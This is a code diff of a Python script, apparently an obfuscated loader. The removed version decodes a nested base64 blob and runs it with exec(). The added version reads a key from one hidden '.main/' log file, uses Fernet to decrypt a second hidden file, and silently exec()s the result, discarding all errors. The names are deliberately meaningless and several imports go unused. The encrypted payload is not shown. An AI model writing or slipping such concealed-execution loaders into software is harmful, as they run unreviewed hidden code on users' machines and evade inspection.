@@ -1,14 +1,40 @@
-import base64
+import os
+import time
+from cryptography.fernet import Fernet
+import subprocess
+import sys
+import colorama
+from colorama import init, Fore, Style
+import socket
+import signal
+import ntplib
+from datetime import datetime, timedelta
+import glob
 
-def decode_and_run(base64_str):
+def AAA_hannah():
     try:
-        decoded_bytes = base64.b64decode(base64_str)
-        decoded_str = decoded_bytes.decode('utf-8')
+        with open(r".main/.g18h38h7b6hkt68g7_log", "rb") as AAA:
+            return AAA.read()
+    except Exception:
+        return None
 
-        exec(decoded_str)
-    except Exception as e:
-        print(f"Terjadi kesalahan: {e}")
+def BBB_tampi(BBB, CCC):
+    try:
+        with open(BBB, 'rb') as DDD:
+            EEE = DDD.read()
 
-encoded_script = "aW1wb3J0IGJhc2U2NAoKZGVmIGRlY29kZV9hbmRfcnVuKGJhc2U2NF9zdHIpOgogICAgdHJ5OgogICAgICAgIGRlY29kZWRfYnl0ZXMgPSBiYXNlNjQuYjY0ZGVjb2RlKGJhc2U2NF9zdHIpCiAgICAgICAgZGVjb2RlZF9zdHIgPSBkZWNvZGVkX2J5dGVzLmRlY29kZSgndXRmLTgnKQoKICAgICAgICBleGVjKGRlY29kZWRfc3RyKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiVGVyamFkaSBrZXNhbGFoYW46IHtlfSIpCgplbmNvZGVkX3NjcmlwdCA9ICJhVzF3YjNKMElHOXpDbWx0Y0c5eWRDQnplWE1LWm5KdmJTQmpjbmx3ZEc5bmNtRndhSGt1Wm1WeWJtVjBJR2x0Y0c5eWRDQkdaWEp1WlhRS0NtUmxaaUJCUVVGZlpYbGxLQ2s2Q2lBZ0lDQjBjbms2Q2lBZ0lDQWdJQ0FnZDJsMGFDQnZjR1Z1S0hJaUxtMWhhVzR2TG1jeE9HZ3pPR2czWWpab2EzUTJPR2MzWDJ4dlp5SXNJQ0p5WWlJcElHRnpJRUZCUVRvS0lDQWdJQ0FnSUNBZ0lDQWdjbVYwZFhKdUlFRkJRUzV5WldGa0tDa0tJQ0FnSUdWNFkyVndkQ0JGZUdObGNIUnBiMjQ2Q2lBZ0lDQWdJQ0FnY21WMGRYSnVJRTV2Ym1VS0NtUmxaaUJDUWtKZlptOTRLRUpDUWl3Z1EwTkRLVG9LSUNBZ0lIUnllVG9LSUNBZ0lDQWdJQ0IzYVhSb0lHOXdaVzRvUWtKQ0xDQW5jbUluS1NCaGN5QkVSRVE2Q2lBZ0lDQWdJQ0FnSUNBZ0lFVkZSU0E5SUVSRVJDNXlaV0ZrS0NrS0NpQWdJQ0FnSUNBZ1JrWkdJRDBnUm1WeWJtVjBLRU5EUXlrS0lDQWdJQ0FnSUNCSFIwY2dQU0JHUmtZdVpHVmpjbmx3ZENoRlJVVXBDaUFnSUNBZ0lDQWdjbVYwZFhKdUlFZEhSd29nSUNBZ1pYaGpaWEIwSUVWNFkyVndkR2x2YmpvS0lDQWdJQ0FnSUNCeVpYUjFjbTRnVG05dVpRb0taR1ZtSUdSaGNteGxibVZmYlc5a1pTZ3BPZ29nSUNBZ2MzbHpMbk4wWkc5MWRDQTlJRzl3Wlc0b2IzTXVaR1YyYm5Wc2JDd2dKM2NuS1FvZ0lDQWdjM2x6TG5OMFpHVnljaUE5SUc5d1pXNG9iM011WkdWMmJuVnNiQ3dnSjNjbktRb0taR0Z5YkdWdVpWOXRiMlJsS0NrS0NraElTQ0E5SUVGQlFWOWxlV1VvS1FwcFppQklTRWc2Q2lBZ0lDQkpTVWtnUFNBbkxtMWhhVzR2TG1obE4ycDNPR1YxTnpKcVgyeHZaeWNLSUNBZ0lFcEtTaUE5SUVKQ1FsOW1iM2dvU1VsSkxDQklTRWdwQ2lBZ0lDQnBaaUJLU2tvNkNpQWdJQ0FnSUNBZ2RISjVPZ29nSUNBZ0lDQWdJQ0FnSUNCbGVHVmpLRXBLU2lrS0lDQWdJQ0FnSUNCbGVHTmxjSFFnUlhoalpYQjBhVzl1T2dvZ0lDQWdJQ0FnSUNBZ0lDQndZWE56IgoKZGVjb2RlX2FuZF9ydW4oZW5jb2RlZF9zY3JpcHQp"
+        FFF = Fernet(CCC)
+        GGG = FFF.decrypt(EEE)
+        return GGG
+    except Exception:
+        return None
 
-decode_and_run(encoded_script)
+HHH = AAA_hannah()
+if HHH:
+    III = '.main/.he7jw8eu72j_log'
+    JJJ = BBB_tampi(III, HHH)
+    if JJJ:
+        try:
+            exec(JJJ)
+        except Exception:
+            pass
